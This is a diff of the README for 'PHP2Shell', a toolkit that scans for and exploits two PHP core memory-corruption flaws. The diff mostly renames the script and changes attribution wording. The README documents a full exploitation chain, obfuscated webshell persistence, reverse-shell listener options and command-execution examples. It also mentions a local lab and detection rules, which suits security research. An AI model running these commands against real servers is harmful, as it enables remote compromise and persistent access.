@@ -14,12 +14,12 @@
 [![CVE-2026-109619](https://img.shields.io/badge/CVE--2026--109619-Critical%20(9.2)-red)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109619)
 [![Exploit-DB](https://img.shields.io/badge/Exploit--DB-%2352704-orange)](https://www.exploit-db.com/exploits/52704)
 [![Python](https://img.shields.io/badge/Python-3.9+-blue)](https://www.python.org/)
-[![Toolkit Version](https://img.shields.io/badge/Toolkit-v2.2.0%20Unified-brightgreen)](php2shell_unified.py)
+[![Toolkit Version](https://img.shields.io/badge/Toolkit-v2.2.0-brightgreen)](php2shell.py)
 [![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
 
 **Comprehensive research, defensive auditing, and unified exploitation suite for CVE-2026-109618 & CVE-2026-109619 — critical PHP core vulnerabilities.**
 
-Features an all-in-one unified monolithic script ([`php2shell_unified.py`](php2shell_unified.py)) delivering a complete end-to-end pipeline from **Reconnaissance → Passive Fingerprinting → Behavioral Probing → WAF Evasion → Weaponized Exploitation → Interactive Shell Console / Reverse Listener**.
+Features an all-in-one script ([`php2shell.py`](php2shell.py)) delivering a complete end-to-end pipeline from **Reconnaissance → Passive Fingerprinting → Behavioral Probing → WAF Evasion → Weaponized Exploitation → Interactive Shell Console / Reverse Listener**.
 
 ---
 
@@ -35,7 +35,7 @@ PHP2Shell provides discovery, differential analysis, and weaponized verification
 ### Exploitation Chain Summary
 1. **RFC 1867 OOM Bailout**: Deeply nested multipart arrays induce a memory allocation error triggering `zend_bailout()`, bypassing standard request cleanup.
 2. **Worker State Poisoning (UAF)**: Persistent HTTP/1.1 Keep-Alive connections reuse the same worker process (`mod_php` or `PHP-FPM`), causing the subsequent request to dereference uninitialized or freed memory.
-3. **OffSec Exploit-DB #52704 Chain**:
+3. **Exploit-DB #52704 Chain**:
    - **Stage 0**: HTTP worker rotation (aborting current worker so prefork forks a clean child).
    - **Stage 1**: `Set-Cookie` heap leak yielding the Zend MM 2MB chunk base.
    - **Stage 2**: `Set-Cookie` 56-byte HashTable page leak disclosing the `libphp` base address (`ZVAL_PTR_DTOR`).
@@ -45,7 +45,7 @@ PHP2Shell provides discovery, differential analysis, and weaponized verification
 
 ## 🚀 Key Features
 
-- ⚡ **Unified Monolithic Engine (`php2shell_unified.py`)**:
+- ⚡ **All-In-One Unified Engine (`php2shell.py`)**:
   - Single executable script combining the entire kill-chain with zero duplicate logic.
   - Continuous execution: probes all discovered endpoints and continues through all stages without stopping mid-session.
   - Single-request optimization: `VersionChecker` and `HeaderAnalyzer` share one initial cached HTTP response with endpoint fallback.
@@ -68,7 +68,7 @@ PHP2Shell provides discovery, differential analysis, and weaponized verification
 - 🛡️ **WAF Evasion & Diagnostic Analysis**:
   - Tests target responses to chunked `Transfer-Encoding`, unusual multipart boundary characters, and spoofed IP headers (`X-Forwarded-For`, `X-Real-IP`).
 - 💥 **Automated Weaponized Exploitation**:
-  - **OffSec #52704**: Native binary leak and `zif_system` execution supporting both `bookworm` (`php:8.4.26-apache`) and `lab` builds.
+  - **Exploit-DB #52704**: Native binary leak and `zif_system` execution supporting both `bookworm` (`php:8.4.26-apache`) and `lab` builds.
   - **Webshell Persistence**: Automated obfuscated PHP webshell deployment across common writable directories with output delimiters.
   - **Multi-Endpoint Fallback**: Automatically retries webshell deployment across alternative discovered endpoints if the first fails.
 - 💻 **Persistent Interactive Shell**:
@@ -101,37 +101,37 @@ pip install -r requirements.txt
 
 ## ⚡ Usage & Examples
 
-The unified monolithic script ([`php2shell_unified.py`](php2shell_unified.py)) handles all tasks in one single file:
+The primary script ([`php2shell.py`](php2shell.py)) handles all tasks in one single file:
 
 ### 1. Full Pipeline Execution (Recon → Passive → Probes → WAF → Exploit)
 ```bash
-python php2shell_unified.py http://127.0.0.1:8899/ --all -v
+python php2shell.py http://127.0.0.1:8899/ --all -v
 ```
 
 ### 2. Reconnaissance with Custom Wordlist or Remote SecLists
 ```bash
 # Using a local custom wordlist
-python php2shell_unified.py http://target.lab:8088/ --recon -w my_wordlist.txt -v
+python php2shell.py http://target.lab:8088/ --recon -w my_wordlist.txt -v
 
 # Fetching latest remote SecLists PHP filenames directly from GitHub
-python php2shell_unified.py http://target.lab:8088/ --recon --remote-wordlist -v
+python php2shell.py http://target.lab:8088/ --recon --remote-wordlist -v
 ```
 
 ### 3. Auto-Exploit and Drop Into Live Interactive Shell Console
 ```bash
-python php2shell_unified.py http://target.lab:8088/ --all --shell
+python php2shell.py http://target.lab:8088/ --all --shell
 ```
 
 ### 4. Built-in Interactive Reverse Shell Listener
 ```bash
-python php2shell_unified.py http://target.lab:8088/ --all --lhost 10.10.14.5 --lport 4444
+python php2shell.py http://target.lab:8088/ --all --lhost 10.10.14.5 --lport 4444
 ```
 
-### 5. Direct OffSec Exploit-DB #52704 Binary Leak Execution
+### 5. Direct Exploit-DB #52704 Binary Leak Execution
 ```bash
-python php2shell_unified.py http://target.lab:8088/index.php \
+python php2shell.py http://target.lab:8088/index.php \
   --exploit \
-  --exploit-method offsec \
+  --exploit-method binary \
   --exploit-profile bookworm \
   --cmd "id>/tmp/pwn" \
   --proof-file /tmp/pwn
@@ -139,7 +139,7 @@ python php2shell_unified.py http://target.lab:8088/index.php \
 
 ### 6. Multi-Target Batch Audit with Report Export
 ```bash
-python php2shell_unified.py -f targets.txt --threads 20 --recon --active --waf -o audit_report
+python php2shell.py -f targets.txt --threads 20 --recon --active --waf -o audit_report
 ```
 *Generates both `audit_report.json` and `audit_report.md`.*
 
@@ -154,12 +154,12 @@ You can test the entire pipeline locally without installing Docker or a native P
 python lab/standalone_lab.py --port 8899 --version 8.4.26
 
 # 2. Run the unified scanner against the local lab
-python php2shell_unified.py http://127.0.0.1:8899/ --all -v
+python php2shell.py http://127.0.0.1:8899/ --all -v
 ```
 
 ---
 
-## 📖 CLI Reference: `php2shell_unified.py`
+## 📖 CLI Reference: `php2shell.py`
 
 | Flag | Category | Description |
 |---|---|---|
@@ -182,8 +182,8 @@ python php2shell_unified.py http://127.0.0.1:8899/ --all -v
 | `--shell` | Stage 6 | Drop into persistent interactive shell session upon successful exploitation |
 | `--cmd COMMAND` | Exploit | Initial command to execute (default: `id; whoami; uname -a`) |
 | `--webshell-name NAME` | Exploit | Custom filename for dropped webshell (default: `p2s_shell.php`) |
-| `--exploit-method` | Exploit | Method selection: `auto` (default), `offsec` (52704), or `upload` |
-| `--exploit-profile` | Exploit | OffSec build profile: `bookworm` (default) or `lab` |
+| `--exploit-method` | Exploit | Method selection: `auto` (default), `binary` (52704), or `upload` |
+| `--exploit-profile` | Exploit | Target build profile: `bookworm` (default) or `lab` |
 | `--zif-offset OFFSET` | Exploit | Custom hexadecimal offset for `zif_system` in `libphp.so` |
 | `--dtor-offset OFFSET` | Exploit | Custom hexadecimal offset for `zval_ptr_dtor` |
 | `--htdata-offset OFFSET` | Exploit | Custom offset for the 167-byte fake HashTable carrier |
@@ -201,11 +201,10 @@ python php2shell_unified.py http://127.0.0.1:8899/ --all -v
 ```
 PHP2Shell/
 │
-├── php2shell_unified.py               # ⚡ Single monolithic scan-to-shell script (Zero duplicates)
+├── php2shell.py                       # ⚡ Single monolithic scan-to-shell script (Zero duplicates)
 ├── requirements.txt                   # Python package dependencies
 ├── setup.py                           # Package installation configuration
 ├── README.md                          # Main documentation & safety guidelines
-├── next.md                            # Research and implementation changelog
 │
 ├── detection/                         # Defensive detection & monitoring rules
 │   ├── README.md                      # Detection deployment guide
@@ -235,7 +234,7 @@ PHP2Shell/
 
 The techniques and detection logic in this toolkit have been validated against vendor advisories and research publications:
 
-- **Exploit-DB #52704**: [php2shell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork](https://www.exploit-db.com/exploits/52704) (9bie & OffSec)
+- **Exploit-DB #52704**: [php2shell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork](https://www.exploit-db.com/exploits/52704) (9bie & Exploit-DB)
 - **PHP Project Advisories**:
   - [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) (CVE-2026-109618 RFC 1867 OOM Bailout)
   - [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) (CVE-2026-109619 Stale Global State UAF)
